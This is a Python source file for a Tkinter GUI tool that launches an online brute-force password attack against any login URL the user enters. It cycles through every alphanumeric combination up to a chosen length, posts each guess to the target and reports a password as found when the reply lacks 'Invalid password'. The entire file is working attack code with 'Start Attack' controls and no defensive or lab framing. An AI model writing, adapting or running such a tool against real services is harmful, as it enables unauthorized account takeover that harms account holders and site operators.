import requests
import threading
import itertools
import string
import tkinter as tk
from tkinter import ttk

stop_flag = threading.Event()

def perform_brute_force(target_url, username, max_length, output_text):
    output_text.delete(1.0, tk.END)
    output_text.insert(tk.END, f"Starting brute force attack on {target_url} (Max Length: {max_length})...\n\n")
    
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
    stop_flag.clear()
    
    def attempt_login(password):
        if not output_text.winfo_exists() or stop_flag.is_set():
            return True  # Stop execution
        
        try:
            response = requests.post(target_url, data={"username": username, "password": password}, timeout=5)
            
            def update_output():
                output_text.insert(tk.END, f"Trying: {password}\n")
                output_text.see(tk.END)  # Auto-scroll to the latest line
            
            output_text.after(0, update_output)
            
            if response.status_code == 200 and "Invalid password" not in response.text:
                output_text.after(0, lambda: output_text.insert(tk.END, f"[+] Valid Credentials Found: {username}:{password}\n"))
                stop_flag.set()
                return True
        except requests.RequestException:
            pass
        return False
    
    def attack():
        for length in range(1, max_length + 1):
            for password in itertools.product(charset, repeat=length):
                if attempt_login("".join(password)):
                    return
                if stop_flag.is_set():  # Stop if flag is set
                    output_text.after(0, lambda: output_text.insert(tk.END, "\nBrute force attack stopped.\n"))
                    return
        
        if output_text.winfo_exists():
            output_text.after(0, lambda: output_text.insert(tk.END, "\nBrute force attack completed.\n"))

    attack_thread = threading.Thread(target=attack)
    attack_thread.start()

def stop_execution():
    stop_flag.set()

def display_brute_force(gui_frame):
    for widget in gui_frame.winfo_children():
        widget.destroy()
    
    tk.Label(gui_frame, text="Brute Force Attack", font=("Arial", 14)).pack(pady=10)
    tk.Label(gui_frame, text="Target URL:").pack()
    url_entry = tk.Entry(gui_frame, width=40)
    url_entry.pack(pady=5)
    tk.Label(gui_frame, text="Username:").pack()
    username_entry = tk.Entry(gui_frame, width=40)
    username_entry.pack(pady=5)
    tk.Label(gui_frame, text="Max Password Length:").pack()
    length_entry = tk.Entry(gui_frame, width=10)
    length_entry.pack(pady=5)
    output_text = tk.Text(gui_frame, height=15, width=80)
    output_text.pack(pady=5)
    
    attack_button = tk.Button(gui_frame, text="Start Attack", command=lambda: perform_brute_force(
        url_entry.get().strip(), username_entry.get().strip(), int(length_entry.get().strip()), output_text))
    attack_button.pack(pady=5)
    
    stop_button = tk.Button(gui_frame, text="Stop Attack", command=stop_execution)
    stop_button.pack(pady=5)
